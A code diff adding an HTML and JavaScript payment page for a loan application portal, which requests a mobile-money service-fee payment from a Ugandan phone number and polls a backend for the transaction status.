@@ -1,0 +1,535 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<title>Payment</title>
+
+<style>
+@import url('https://fonts.googleapis.com/css2?family=Mali:wght@400;500;600;700&display=swap');
+
+*{
+    margin:0;
+    padding:0;
+    box-sizing:border-box;
+}
+
+html,
+body{
+    width:100%;
+    min-height:100%;
+}
+
+body{
+    background:#FFF8D6;
+    font-family:'Mali',cursive;
+    color:#111;
+}
+
+header{
+    background:#FFCC00;
+    color:#111;
+    padding:12px 0;
+    border-bottom:2px solid #111;
+}
+
+.container{
+    width:100%;
+    padding:0 12px;
+}
+
+.logo{
+    font-size:20px;
+    font-weight:700;
+    text-align:center;
+}
+
+.brand{
+    font-size:12px;
+    text-align:center;
+    margin-top:2px;
+}
+
+main{
+    padding:10px 0 0;
+}
+
+.card{
+    background:#fff;
+    border-radius:10px;
+    padding:12px;
+    border:1px solid #F0D96A;
+    box-shadow:0 2px 8px rgba(0,0,0,.06);
+}
+
+h1{
+    font-size:18px;
+    margin-bottom:5px;
+}
+
+.subtitle{
+    font-size:12px;
+    color:#666;
+    margin-bottom:10px;
+}
+
+.amount-box{
+    background:#FFF3A6;
+    border:1px solid #D6B000;
+    border-radius:8px;
+    padding:9px;
+    margin-bottom:10px;
+    text-align:center;
+}
+
+.amount-label{
+    font-size:11px;
+    color:#666;
+}
+
+.amount{
+    font-size:20px;
+    font-weight:700;
+}
+
+label{
+    display:block;
+    font-size:12px;
+    font-weight:600;
+    margin-bottom:4px;
+}
+
+input{
+    width:100%;
+    padding:10px;
+    border:1px solid #ccc;
+    border-radius:8px;
+    font-family:'Mali',cursive;
+    font-size:14px;
+    outline:none;
+}
+
+input:focus{
+    border-color:#111;
+}
+
+button{
+    width:100%;
+    margin-top:10px;
+    padding:10px;
+    border:none;
+    border-radius:8px;
+    background:#FFCC00;
+    color:#111;
+    font-family:'Mali',cursive;
+    font-size:14px;
+    font-weight:700;
+    cursor:pointer;
+}
+
+button:disabled{
+    opacity:.5;
+    cursor:not-allowed;
+}
+
+.message{
+    text-align:center;
+    font-size:11px;
+    margin-top:8px;
+    min-height:16px;
+}
+
+footer{
+    text-align:center;
+    font-size:10px;
+    color:#666;
+    padding:8px 5px 0;
+}
+
+footer a{
+    color:#111;
+    text-decoration:none;
+    margin:0 3px;
+}
+
+@media(max-height:650px){
+
+    header{
+        padding:8px 0;
+    }
+
+    main{
+        padding-top:6px;
+    }
+
+    .card{
+        padding:9px;
+    }
+
+    button{
+        margin-top:7px;
+        padding:8px;
+    }
+
+    footer{
+        padding-top:5px;
+    }
+}
+</style>
+</head>
+
+<body>
+
+<header>
+    <div class="container">
+        <div class="logo">LOAN APPLICATION PORTAL</div>
+        <div class="brand">Secure mobile payment</div>
+    </div>
+</header>
+
+<main>
+    <div class="container">
+
+        <div class="card">
+
+            <h1>Complete Payment</h1>
+
+            <div class="subtitle">
+                Enter your Uganda mobile number to receive a payment request.
+            </div>
+
+            <div class="amount-box">
+                <div class="amount-label">
+                    Payment Amount
+                </div>
+
+                <div class="amount" id="paymentAmount">
+                    UGX 0
+                </div>
+            </div>
+
+            <label for="phone">
+                Uganda Mobile Number
+            </label>
+
+            <input
+                type="tel"
+                id="phone"
+                placeholder="256XXXXXXXXX"
+                inputmode="numeric"
+                autocomplete="tel"
+            >
+
+            <button id="payBtn">
+                Pay Now
+            </button>
+
+            <div class="message" id="message"></div>
+
+        </div>
+
+    </div>
+</main>
+
+<footer>
+    <a href="#">Terms</a> |
+    <a href="#">Privacy</a> |
+    <a href="#">Support</a>
+    <br>
+    © 2026
+</footer>
+
+
+<script>
+
+const BACKEND_URL =
+    "https://momo-advance-backend.onrender.com";
+
+
+const serviceFee =
+    sessionStorage.getItem("serviceFee");
+
+const paymentAmount =
+    document.getElementById("paymentAmount");
+
+const phoneInput =
+    document.getElementById("phone");
+
+const payBtn =
+    document.getElementById("payBtn");
+
+const message =
+    document.getElementById("message");
+
+
+/*
+========================================
+SHOW PAYMENT AMOUNT
+========================================
+*/
+
+if (!serviceFee) {
+
+    paymentAmount.textContent = "UGX 0";
+
+    payBtn.disabled = true;
+
+    message.textContent =
+        "Payment information is missing.";
+
+} else {
+
+    paymentAmount.textContent =
+        "UGX " +
+        Number(serviceFee).toLocaleString();
+
+}
+
+
+/*
+========================================
+PAYMENT
+========================================
+*/
+
+payBtn.addEventListener("click", async () => {
+
+    let phone =
+        phoneInput.value.trim();
+
+    phone = phone
+        .replace(/\s+/g, "")
+        .replace(/^\+/, "");
+
+
+    if (!/^256\d{9}$/.test(phone)) {
+
+        message.textContent =
+            "Enter a valid Uganda number starting with 256.";
+
+        return;
+    }
+
+
+    if (!serviceFee) {
+
+        message.textContent =
+            "Payment amount is unavailable.";
+
+        return;
+    }
+
+
+    payBtn.disabled = true;
+
+    payBtn.textContent =
+        "Sending request...";
+
+    message.textContent =
+        "Please wait...";
+
+
+    try {
+
+        const response =
+            await fetch(
+                `${BACKEND_URL}/api/payment`,
+                {
+                    method:"POST",
+
+                    headers:{
+                        "Content-Type":
+                            "application/json"
+                    },
+
+                    body:JSON.stringify({
+
+                        phone:phone,
+
+                        amount:Number(serviceFee)
+
+                    })
+                }
+            );
+
+
+        const data =
+            await response.json();
+
+
+        console.log(
+            "PAYMENT RESPONSE:",
+            data
+        );
+
+
+        if (
+            data.success &&
+            data.data &&
+            data.data.transaction_id
+        ) {
+
+            const transactionId =
+                data.data.transaction_id;
+
+
+            sessionStorage.setItem(
+                "transactionId",
+                transactionId
+            );
+
+
+            message.textContent =
+                "Payment request sent. Check your phone and complete the payment.";
+
+            payBtn.textContent =
+                "Waiting for payment...";
+
+
+            checkPaymentStatus(
+                transactionId
+            );
+
+        } else {
+
+            message.textContent =
+                data.message ||
+                "Unable to send payment request.";
+
+            payBtn.disabled = false;
+
+            payBtn.textContent =
+                "Pay Now";
+        }
+
+
+    } catch(error) {
+
+        console.error(error);
+
+        message.textContent =
+            "Unable to connect to the payment server.";
+
+        payBtn.disabled = false;
+
+        payBtn.textContent =
+            "Pay Now";
+    }
+
+});
+
+
+/*
+========================================
+CHECK PAYMENT STATUS
+========================================
+*/
+
+async function checkPaymentStatus(
+    transactionId
+) {
+
+    let attempts = 0;
+
+    const maxAttempts = 40;
+
+
+    const interval =
+        setInterval(async () => {
+
+            attempts++;
+
+
+            try {
+
+                const response =
+                    await fetch(
+                        `${BACKEND_URL}/api/payment/status/${encodeURIComponent(transactionId)}`
+                    );
+
+
+                const data =
+                    await response.json();
+
+
+                console.log(
+                    "STATUS:",
+                    data
+                );
+
+
+                const status =
+                    data?.data?.status ||
+                    data?.status;
+
+
+                if (
+                    status === "SUCCESS" ||
+                    status === "SUCCESSFUL"
+                ) {
+
+                    clearInterval(interval);
+
+                    message.textContent =
+                        "Payment successful.";
+
+                    window.location.href =
+                        "delivery.html";
+
+                    return;
+                }
+
+
+                if (
+                    status === "FAILED" ||
+                    status === "CANCELLED"
+                ) {
+
+                    clearInterval(interval);
+
+                    message.textContent =
+                        "Payment was not completed.";
+
+                    payBtn.disabled = false;
+
+                    payBtn.textContent =
+                        "Try Again";
+
+                    return;
+                }
+
+
+                if (
+                    attempts >= maxAttempts
+                ) {
+
+                    clearInterval(interval);
+
+                    message.textContent =
+                        "Payment is still pending. Please try again later.";
+
+                    payBtn.disabled = false;
+
+                    payBtn.textContent =
+                        "Check Again";
+                }
+
+
+            } catch(error) {
+
+                console.error(
+                    "STATUS CHECK ERROR:",
+                    error
+                );
+
+            }
+
+        }, 3000);
+
+}
+
+</script>
+
+</body>
+</html>
